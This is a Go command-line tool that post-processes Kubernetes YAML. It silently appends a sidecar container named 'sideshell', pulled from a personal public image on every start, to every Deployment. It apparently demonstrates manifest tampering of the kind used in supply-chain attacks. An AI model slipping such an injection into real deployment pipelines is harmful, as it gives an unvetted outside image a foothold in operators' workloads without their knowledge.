package main

import (
	"fmt"
	"io"

	"log"
	"os"

	"gopkg.in/yaml.v3"
)

func usage() {
	fmt.Println("usage: kpostprocess [filename]")
	os.Exit(1)
}

func extractMapOfString(data map[string]interface{},key string) (map[string]interface{}, bool) {
	val , ok := data[key]
	if !ok {
		return nil, ok
	}

	r , ok := val.(map[string]interface{})
	if !ok {
		return nil, ok
	}

	return r, true
}

func extract(data map[interface{}]interface{},key string) (map[string]interface{}, bool) {
	val , ok := data[key]
	if !ok {
		return nil, ok
	}

	r , ok := val.(map[string]interface{})
	if !ok {
		return nil, ok
	}

	return r, true
}

func buildSidecar() map[string]interface{} {
	sidecar := make(map[string]interface{})

	sidecar["name"] = "sideshell"
	sidecar["image"] = "sebastienlaurent/sideshell:latest"
	sidecar["imagePullPolicy"] = "Always"

	return sidecar
}

func process(data map[interface{}]interface{}) map[interface{}]interface{} {
	kind , ok := data["kind"]
	if !ok {
		return data
	}

	if kind != "Deployment" {
		return data
	}

	spec , ok := extract(data,"spec")
	if !ok {
		return data
	}

	temp , ok := extractMapOfString(spec,"template")
	if !ok {
		return data
	}

	spec , ok =  extractMapOfString(temp,"spec")
	if !ok {
		return data
	}

	cont , ok := spec["containers"]
	if !ok {
		return data
	}

	ctab , ok := cont.([]interface{})
	if !ok {
		return data
	}

	sidecar := buildSidecar()

	ctab = append(ctab,sidecar)

	spec["containers"] = ctab
	
	return data
}

func main() {
	if len(os.Args) > 2 {
		usage()
	}

	var err error

	var decoder *yaml.Decoder
	if len(os.Args) == 2 {
		r , err := os.Open(os.Args[1])
		if err != nil {
			log.Fatalf("Cannot read data: %v",err)	
		}

		decoder = yaml.NewDecoder(r)
	} else {
		decoder = yaml.NewDecoder(os.Stdin)
	}

	encoder := yaml.NewEncoder(os.Stdout)

	for {
		data := make(map[interface{}]interface{})

		err = decoder.Decode(data)
		if err == io.EOF {
			break
		}
		if err != nil {
			log.Fatalf("Cannot parse: %v",err)
		}

		data = process(data)

		encoder.Encode(data)
	}
}
